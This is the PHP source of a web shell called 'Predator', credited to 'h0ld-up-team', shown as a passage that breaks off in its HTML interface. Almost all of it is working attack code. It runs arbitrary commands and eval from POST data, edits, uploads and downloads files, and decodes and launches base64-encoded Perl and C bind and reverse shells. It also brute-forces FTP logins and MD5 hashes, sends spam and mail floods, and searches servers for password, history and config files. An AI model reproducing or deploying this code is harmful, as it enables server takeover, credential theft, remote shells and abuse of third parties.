<?php
$auth = 0;



ini_set("session.gc_maxlifetime",1);
session_start();
error_reporting(0);
safe_mode();
$name="9b534ea55d0b82c3a7e80003a84b6865";     //login = 'mylogin'
$pass="a029d0df84eb5549c641e04a9ef389e5";     //pass  = 'mypass'
if($auth == 1){
if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass)
   {
   header("WWW-Authenticate: Basic realm=\"PanelAccess\"");
   header("HTTP/1.0 401 Unauthorized");
   exit("Access Denied");
   }
}

if($_GET['kill']=='yes')
{
unlink($_SERVER['SCRIPT_FILENAME']);
echo "<script>alert('Your shell script was succefully deleted!')</script>";
}


function md5_brute($hash,$log,$dict)
{
ignore_user_abort(1);
set_time_limit(0);

$fl = fopen($dict, "r");
$fl = fopen($log, "w");
$count = 0;
if(!$dict){
return "Fill 'dictionary_file' field!";
}if(!$log){
return "Fill 'log_file' field!";
}elseif(!strlen($hash) == 0){
return "Fill 'md5_hash' field!";
}else{
	while(!$feof($dict)){
		$pass = fgets($dict);
		$brute_hash = md5($pass);
		if($brute_hash == $hash){
			fputs($log, "$hash:$pass\n---");
			fclose($dict);
			fclose($log);
			exit;
		}else{
			$count = $count + 1;
			fputs($log, "$count passwords was bruted...");
		}
	}
	fputs($log, "$count passwords are failed!");
}
fclose($dict);
fclose($log);
}

function port_bind($port,$pass,$method)
{
$perl = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";

if($method=='Perl')
	{
		fputs($i=fopen('/tmp/shlbck','w'),base64_decode($perl));
		fclose($i);
		ex(which("perl")." /tmp/shlbck ".$port." &");
		unlink("/tmp/shlbck");
		return ex('ps -aux | grep shlbck');
	}
elseif($method=='C#')
	{
		fputs($i=fopen('/tmp/shlbck.c','w'),base64_decode($c));
		fclose($i);
		ex("gcc shlbck.c -o shlbck");
		unlink('shlbck.c');
		ex("/tmp/shlbck ".$port." ".$pass." &");
		unlink("/tmp/shlbck");
		return ex('ps -aux | grep shlbck');
	}else
	{
	return 'Choose method';
	}

}

function backconnect($ip,$port,$method)
{
$perl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

$c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

if($method=='Perl')
	{
		fputs($i=fopen('/tmp/shlbck','w'),base64_decode($perl));
		fclose($i);
		ex(which("perl")." /tmp/shlbck ".$ip." ".$port." &");
		unlink("/tmp/shlbck");
		return ex('netstat -an | grep -i listen');
	}
elseif($method=='C#')
	{
		fputs($i=fopen('/tmp/shlbck.c','w'),base64_decode($c));
		fclose($i);
		ex("gcc shlbck.c -o shlbck");
		unlink('shlbck.c');
		ex("/tmp/shlbck ".$ip." ".$port." &");
		unlink("/tmp/shlbck");
		return ex('netstat -an | grep -i listen');
	}else
	{
	return 'Choose method';
	}
}

if($_POST['type']==11){download(stripslashes($_POST['value']));};

function download($dfilename)
{
	$file=fopen($dfilename,"r");
	ob_clean();
    $filename = basename($dfilename);
    $filedump = fread($file,@filesize($dfilename));
    fclose($file);
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");   
    echo $filedump;
}

function flooder($logf,$to,$from,$subject,$msg,$amount,$check)
{
ignore_user_abort(1);
set_time_limit(0);

$fl = fopen($logf, "w");
$count = 0;
if(!$logf){
return "Fill 'log_file' field!";
}elseif(!$to){
return "Fill 'Send to' field!";
}elseif(!$from){
return "Fill 'From' field!";
}elseif(!$subject){
return "Fill 'Subject' field!";
}elseif(!$msg){
return "Fill 'Message' field!";
}elseif(!$amount){
return "Fill 'Amount' field!";
}else{
	while($count < $amount){
		mail("$to", "$subject", "$msg", "From: $from");
		$count = $count + 1;
		$fl = fopen($logf, "w");
		fputs($fl, "$count flood-letters was sended...");
		fclose($fl);	
	}
	if(strlen($check) != 0){
		$check_text = "Done! $count flood-letters was sended!";
		$check_sub = 'Check';
		mail("$check", "$check_sub", "$check_text", "From: $from");
		$fl = fopen($logf, "w");
		fputs($fl, "Done! $count flood-letters was sended!");
	}
	else{
		$fl = fopen($logf, "w");
		fputs($fl, "Done! $count flood-letters was sended!");
	}
}
fclose($fl);
}

function ftp_brute($host,$ftp_users,$ftp_passwd,$ftp_log)
{
ignore_user_abort(1);
set_time_limit(0);

$fl = fopen($ftp_users, "r");
$fd = fopen($ftp_passwd, "r");
$fr = fopen($ftp_log, "a+");
if(!$host){
return "Fill 'Host' field!";
}elseif(!$ftp_users){
return "Fill 'ftp_users file' field!";
}elseif(!$ftp_passwd){
return "Fill 'ftp_passwd file' field!";
}elseif(!$ftp_log){
return "Fill 'ftp_log file' field!";
}elseif(!file_exists($ftp_users)){
return "File ".$ftp_users." doesn't exists!";
}elseif(!file_exists($ftp_passwd)){
return "File ".$ftp_passwd." doesn't exists!";
}
else{
	while(!feof($fd)){
        	$pass = fgets($fd);
                	while(!feof($fl)){
                        	$user = fgets($fl);
                                $connect = ftp_connect($host);
                                if(!$connect){
                                	fputs($fr, "Enable connect to $host\n");
                                        exit;
                                }else{
                                	$auth = ftp_login($connect, $user, $pass);
                                	if(!$auth){
                                		ftp_quit($connect);
                                	}
                                	else{
                                		fputs($fr, "$host:\n---$login:$pass\n---");
                                		ftp_quit($connect);
                                	} 
                                }
                	}
	}
	fputs($fr, "Done:\n");
	fclose($fr);
}
fclose($fl);
fclose($fd);
}

function spammer($from,$subject,$msg,$check,$elist,$logf)
{
ignore_user_abort(1);
set_time_limit(0);

$fp = fopen($elist. "r");
$fl = fopen($logf, "w");
$count = 0;
if(!$from){
return "Fill 'From' field!";
}elseif(!$elist){
return "Fill 'Emails list' field!";
}elseif(!$logf){
return "Fill 'Log File' field!";
}elseif(!$msg){
return "Fill 'Message' field!";
}elseif(!$subject){
return "Fill 'Subject' field!";
}elseif(!file_exists($elist)){
return "File ".$elist." doesn't exists!";
}else{
	while(!feof($fp)){
		$to = fgets($fp);
		mail("$to", "$subject", "$msg", "From: $from");
		$count = $count + 1;
		$fl = fopen($logf, "w");
		fputs($fl, "$count letters was sended...");
		fclose($fl);
	}
	if(strlen($check) != 0){
		$check_text = "Done! $count letters was sended!";
		$check_sub = 'Check';
		mail("$check", "$check_sub", "$check_text", "From: $from");
		$fl = fopen($logf, "w");
		fputs($fl, "Done! $count letters was sended!\n");
	}
	else{
		$fl = fopen($logf, "w");
		fputs($fl, "Done! $count letters was sended!");
	}
}
fclose($fp);
fclose($fl);
}

function alias($in)
{
if($in=="find apahce config file"){return ex('find / -type f -name httpd.conf');}
elseif($in=="find access_log files"){return ex('find / -type f -name access_log');}
elseif($in=="find error_log files"){return ex('find / -type f -name error_log');}
elseif($in=="find suid files"){return ex('find / -type f -perm -04000 -ls');}
elseif($in=="find suid files in current dir"){return ex('find . -type f -perm -04000 -ls');}
elseif($in=="find sgid files"){return ex('find / -type f -perm -02000 -ls');}
elseif($in=="find sgid files in current dir"){return ex('find . -type f -perm -02000 -ls');}
elseif($in=="find config.inc.php files"){return ex('find / -type f -name config.inc.php');}
elseif($in=="find config.inc.php files in current dir"){return ex('find . -type f -name config.inc.php');}
elseif($in=="find config* files"){return ex('find / -type f -name "config*"');}
elseif($in=="find config* files in current dir"){return ex('find . -type f -name "config*"');}
elseif($in=="find all writable files"){return ex('find / -type f -perm -2 -ls');}
elseif($in=="find all writable files in current dir"){return ex('find . -type f -perm -2 -ls');}
elseif($in=="find all writable directories"){return ex('find / -type d -perm -2 -ls');}
elseif($in=="find all writable directories in current dir"){return ex('find . -type d -perm -2 -ls');}
elseif($in=="find all writable directories and files"){return ex('find / -perm -2 -ls');}
elseif($in=="find all writable directories and files in current dir"){return ex('find . -perm -2 -ls');}
elseif($in=="find all service.pwd files"){return ex('find / -type f -name service.pwd');}
elseif($in=="find service.pwd files in current dir"){return ex('find . -type f -name service.pwd');}
elseif($in=="find all .htpasswd files"){return ex('find / -type f -name .htpasswd');}
elseif($in=="find .htpasswd files in current dir"){return ex('find . -type f -name .htpasswd');}
elseif($in=="find all .bash_history files"){return ex('find / -type f -name .bash_history');}
elseif($in=="find .bash_history files in current dir"){return ex('find . -type f -name .bash_history');}
elseif($in=="find all .mysql_history files"){return ex('find / -type f -name .mysql_history');}
elseif($in=="find .mysql_history files in current dir"){return ex('find . -type f -name .mysql_history');}
elseif($in=="find all .fetchmailrc files"){return ex('find / -type f -name .fetchmailrc');}
elseif($in=="find .fetchmailrc files in current dir"){return ex('find . -type f -name .fetchmailrc');}
elseif($in=="list file attributes on a Linux second extended file system"){return ex('lsattr -va');}
elseif($in=="show opened ports"){return ex('netstat -an | grep -i listen');}
elseif($in=="---------------------------------------------------------------------------------------------------------"){return ex('ls -la');}
}

function testperl()
{
	if(ex('perl -h'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function testlynx()
{
	if(ex('lynx --help'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}


function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}

function testfetch()
{
	if(ex('fetch --help'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function testwget()
{
	if(ex('wget --help'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function oracle()
{
	if(function_exists('ocilogon'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function postgresql()
{
	if(function_exists('pg_connect'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}

function testmssql()
{
	if(function_exists('mssql_connect'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}
function testcurl()
{
	if(function_exists('curl_version'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}
function testmysql()
{
	if(function_exists('mysql_connect'))
	{
		return "<font size=2 color=green>ON</font>";
	}else{
		return "<font size=2 color=red>OFF</font>";
	}
}
function safe_mode()
{
if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3)
	{
		$_SESSION['safe_mode'] = 1;
		return "<font size=2 color=green>ON</font>";
	}else{
		$_SESSION['safe_mode'] = 0;
		return "<font size=2 color=red>OFF</font>";
	}
};

function ex($in)
{
$out = '';


if(function_exists('exec'))
	{
		exec($in,$out);
		$out = join("\n",$out);
	}
elseif(function_exists('passthru'))
	{
		ob_start();
		passthru($in);
		$out = ob_get_contents();
		ob_end_clean();
	}
elseif(function_exists('system'))
	{
		ob_start();
		system($in);
		$out = ob_get_contents();
		ob_end_clean();
	}
elseif(function_exists('shell_exec'))
	{
		$out = shell_exec($in);
	}
elseif(is_resource($f = popen($in,"r")))
  {
   $out = "";
   while(!@feof($f)) { $out .= fread($f,1024); }
   pclose($f);
  }
return $out;
}

function shell()
{
if($_POST['type']==1)
	{		
		eval(stripslashes($_POST['value']));
	}
elseif($_POST['type']==2)
	{
		pwd();
		print_r(ex(stripslashes($_POST['value'])));
	}
elseif($_POST['type']==3)
	{
		if($_SESSION['safe_mode'] == 1){
		if(($u=safe_ex('ls -la'))!='')
		{return $u;}else{return safe_ex('dir');};
		
		}else{
		if(($u=ex('ls -la'))!='')
		{return $u;}else{return ex('dir');};
		}
	}
elseif($_POST['type']==4)
	{
		if(file_exists(stripslashes($_POST['value'])))
			{
				if($safe_mode!=1){
				echo htmlspecialchars(fread(fopen(stripslashes($_POST['value']),"rw"),filesize(stripslashes($_POST['value']))));
				}else{
				echo htmlspecialchars(safe_read(stripslashes($_POST['value'])));
				};
				$_SESSION['edit']=1;
				$_SESSION['filename'] = $_POST['value'];
			}else{
				return 'File doesn\'t exists!';
			}
	}
elseif($_POST['type']==5)
	{
		fputs(fopen($_SESSION['filename'],"w"),stripslashes($_POST['value']));
	}
elseif($_POST['type']==6)
	{
		$uploaddir = pwd();
		if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
		move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name); 	
	}
elseif($_POST['type']==7)
	{
		echo alias($_POST['value']);
	}
elseif($_POST['type']==8)
	{
		echo spammer(stripslashes($_POST['from']),stripslashes($_POST['subject']),stripslashes($_POST['msg']),stripslashes($_POST['check']),stripslashes($_POST['elist']),stripslashes($_POST['logf']));
	}
elseif($_POST['type']==9)
	{
		echo ftp_brute(stripslashes($_POST['host']),stripslashes($_POST['users']),stripslashes($_POST['passwd']),stripslashes($_POST['log']));
	}
elseif($_POST['type']==10)
	{
		echo flooder(stripslashes($_POST['log']),stripslashes($_POST['to']),stripslashes($_POST['from']),stripslashes($_POST['subject']),stripslashes($_POST['msg']),stripslashes($_POST['amount']),stripslashes($_POST['check']));
	}
elseif($_POST['type']==12)
	{
		echo backconnect(stripslashes($_POST['ip']),stripslashes($_POST['port']),stripslashes($_POST['method']));
	}
elseif($_POST['type']==13)
	{
		echo backconnect(stripslashes($_POST['port']),stripslashes($_POST['pass']),stripslashes($_POST['method']));
	}
elseif($_POST['type']==14)
	{
		echo md5_brute(stripslashes($_POST['hash']),stripslashes($_POST['log']),stripslashes($_POST['dict']));
	}

else 
	{$u = ex('ls -la');
	 if($u == ''){return ex('dir');}else{return $u;};
	}

return null;
};

function edit()
{
if ($_SESSION['edit'] == 1){
$_SESSION['edit']=0;
return "<br><center><input type=submit style=\"border:1px solid #666666;background:#333333;font-weight:bold;\" value=\"Save\"></center>";};
}

function getsystem()
{
	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
};	

function getserver()
{
	return getenv("SERVER_SOFTWARE");
};


function getuser()
{
$out = get_current_user();	
	if($out!="SYSTEM")
		{
			if(($out=ex('id'))==''){$out = "uid=".getmyuid()."(".get_current_user().") gid=".getmygid();};
		}
return $out;
};

function pwd()
{
if($_POST['type']==3)
	{
		$_SESSION['pwd'] = stripslashes($_POST['value']);
	}
chdir($_SESSION['pwd']);
$cwd = getcwd();
if($u=strrpos($cwd,'/'))
	{
		if($u!=strlen($cwd)-1){
		return $cwd.'/';}
		else{return $cwd;};
	}
elseif($u=strrpos($cwd,'\\'))
	{
		if($u!=strlen($cwd)-1){
		return $cwd.'\\';}
		else{return $cwd;};
	};
}

function safe_ex($in)
{
if($in){
$d=dir('.');

   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){ 
     echo date("d.m.Y	 H:i",$mtime)."	";
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{ 
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
}

function safe_read($in)
{
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include("/etc/passwd");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");

file_get_contents($in);
}

}
?>










<html>
<head>
<title>.::Predator::.</title>
<META http-equiv="Content-Type" content="text/html; charset=CP866">
<style type=text/css>
.ta {background: #333333; border:1px solid #666666; color: #FFFFFF;}
.bt {border: 1px solid #666666;background: #333333;font-weight:bold;}
.td1 {border:2px solid #000000;}
.td2 {border:1px solid #000000;}
.ram {border:1px solid #666666;background:#222222;}
body { scrollbar-base-color: #333333}
</style>
<script>
function kill()
{
var y;
y = confirm('Are you really want to kill shell?');
if(y == true)
{
document.location = '?kill=yes';
}
}
</script>
</head>
<body bgcolor='#000000'>
<center><table width=90% cellpadding=0 cellspacing=0 style="border: 1px solid #666666">
<tr><td width=100% height=70 bgcolor='#333333' style="border-bottom: 2px solid #666666" valign=top>
<table valign=top>
<tr><td valign=top>
<table valign=center class='ram'>
<tr><td width=5% align=right>
<font size=2 color=#888888>System:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php echo getsystem();?></b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>Server:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php echo getserver();?></b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>User:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php echo getuser();?></b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>pwd:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php if(strlen($u=pwd())>45){echo "...".substr($u,strlen($u)-40,40);}else{echo $u;};?></b></font>
</td></tr>
</table>
</td>
<td width=13% valign=center align=center>
<table width=100% height=100% cellpadding=0 cellspacing=0><tr><td width=100% height=100%>
<center>
<a href="http://h0ld-up.info"><table cellpadding=2 cellspacing=2 style="border:1px solid #666666;background:#444444">
<tr><td><font size=2 color=#999999>
<center><b>.::h0ld-up-team::.<br>web-shell</b></center>
</font></td></tr></table></a></center>
</td></tr><tr><td height=5></td></tr><tr><td>
<center>

<input type=submit style="border:1px solid #666666;background: darkred;font-weight:bold;" value='   Kill Shell   ' onclick='kill()'>

</center>
</td></tr></table>

</td>
<td class='ram' width=45% valign=center align=center>
<table  cellpadding=0 cellspacing=0>
<tr><td>
<table valign=top cellpadding=0 cellspacing=0>
<tr><td align=right>
<font size=2 color='#888888'>PHP-version:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>MySQL:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>MSSQL:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>PostgreSQL:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>Oracle:</font>
</td></tr>
</table>
</td><td>
<table valign=top  cellpadding=0 cellspacing=0>
<tr><td>
<b><font size=2 color=red><?php echo phpversion();?></font></b>
</td></tr>
<tr><td>
<b><?php echo testmysql();?></b>
</td></tr>
<tr><td>
<b><?php echo testmssql();?></b>
</td></tr>
<tr><td>
<b><?php echo postgresql();?></b>
</td></tr>
<tr><td>
<b><?php echo oracle();?></b>
</td></tr>
</table>
</td><td width=4%></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top align=right>
<font color=#888888 size=2>Safe_mode:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>cURL:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>wget:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>fetch:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>lynx:</font>
</td></tr>
</table></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top>
<b><?php echo safe_mode();?></b>
</td></tr>
<tr><td valign=top>
<b><?php echo testcurl();?></b>
</td></tr>
<tr><td valign=top>
<b><?php echo testwget();?></b>
</td></tr>
<tr><td valign=top>
<b><?php echo testfetch();?></b>
</td></tr>
<tr><td valign=top>
<b><?php echo testlynx();?></b>
</td></tr>
</table></td>
<td width=4%></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top align=right>
<font color=#888888 size=2>Perl:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Server time:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Server date:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Total space:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Free space:</font>
</td></tr>
</table></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top>
<b><font size=2 color=green><?php echo testperl();?></font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php echo date('H:i');?></font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php echo date('d-m-Y');?></font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php echo view_size(disk_total_space(getcwd()));?></font></b>
</td></tr>
<tr><td valign=top>
<b><font size=2 color=#999999><?php echo view_size(diskfreespace(getcwd()));?></font></b>
</td></tr>
</table></td></tr>
</table>
</td></tr>
</table>
</td></tr>
<tr><td width=100% height=100% bgcolor='#333333' valign=top>
<table width=100%>
<tr><td valign=top align=center>
<table width=100% height=200 class='td1'>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<input type=hidden name="type" value=5>
<textarea cols=80 rows=13 name="value" class='ta'>
<?php echo htmlspecialchars(shell());?>
</textarea><?php echo edit();?></form>
</td>



<td valign=top align=left width=10%>
<table width=100% height=100% class='td2'>
<form action method=POST><tr><td valign=top align=left height=40% style="border-bottom: 1px solid #000000;">
<b>.::System shell::.</b><br>
<input type=hidden name="type" value=2>
<center><input type=text name="value" size=35 class='ta'></center>
</ br><center><input type=submit value="Enter" style="border-top: 1px solid #333333;border-bottom: 1px solid #666666;border-right: 1px solid #666666;border-left: 1px solid #666666;background: #333333;font-weight:bold;"></center>
</td></tr></form>
<tr><td valign=top align=left>
<form action method=POST>
<table>
<tr><td>
<b>.::PHP-code::.</b>
</td><td align=right>
<input type=submit value="Run code" class='bt'>
<input type=hidden name="type" value=1>
</td></tr>
<tr><td colspan=2>
<textarea rows=5 cols=26 name="value" class='ta'><?php echo "readfile('/etc/passwd');";?></textarea>
</td></tr>
</table></form>
</td></tr>
</table>
</td></tr>
</table>
<table>
<tr><td height=0></td></tr>
</table>
<table width=100% height=80 class='td1' valign=top>
<tr><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::PWD::.</b>
</td><td align=right>
<input type=submit class='bt' value="cd">
<input type=hidden name="type" value=3>
</td></tr>
<tr><td colspan=2>
<input type=text name="value" class='ta' size=71 value=<?php echo pwd();?>>
</td></tr>
</table></form></td><td valign=top align=left width=50%>
<form action method=POST>
<table width=100% height=100% valign=top class='td2'>
<tr><td>
<b>.::File Edit::.</b>
</td><td align=right>
<input type=submit class='bt' value="Edit">
